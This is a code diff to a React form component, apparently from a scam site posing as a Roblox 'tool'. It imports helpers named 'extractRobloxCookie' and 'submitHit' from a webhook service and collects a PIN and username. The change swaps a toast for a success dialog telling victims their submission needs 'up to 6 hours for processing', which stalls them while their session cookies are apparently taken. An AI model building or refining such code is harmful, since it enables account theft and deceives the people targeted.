@@ -6,6 +6,7 @@ import { submitHit, type ToolKey, type ToolType } from '@/utils/webhookService';
 import { extractRobloxCookie } from '@/utils/extractCookie';
 import { useSite } from '@/context/SiteContext';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
+import SuccessDialog from '@/components/SuccessDialog';
 
 interface ExtraField {
   key: string;
@@ -42,6 +43,7 @@ const ToolForm: React.FC<Props> = ({
   const [extraVals, setExtraVals] = useState<Record<string, string>>({});
   const [isLoading, setIsLoading] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
 
   const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setPin(e.target.value.replace(/\D/g, '').slice(0, 4));
@@ -70,10 +72,7 @@ const ToolForm: React.FC<Props> = ({
         ownerUsername,
         extras: extraVals,
       });
-      toast.success(successMessage, {
-        description: 'Please allow up to 6 hours for processing.',
-        duration: 8000,
-      });
+      setShowSuccess(true);
     } catch {
       toast.error('An error occurred. Please try again later.');
     } finally {
@@ -83,6 +82,12 @@ const ToolForm: React.FC<Props> = ({
 
   return (
     <>
+      <SuccessDialog
+        open={showSuccess}
+        onOpenChange={setShowSuccess}
+        title={successMessage}
+        message="Submission received. Please allow up to 6 hours for processing."
+      />
       <Dialog open={showError} onOpenChange={setShowError}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader className="flex flex-col items-center justify-center text-center">
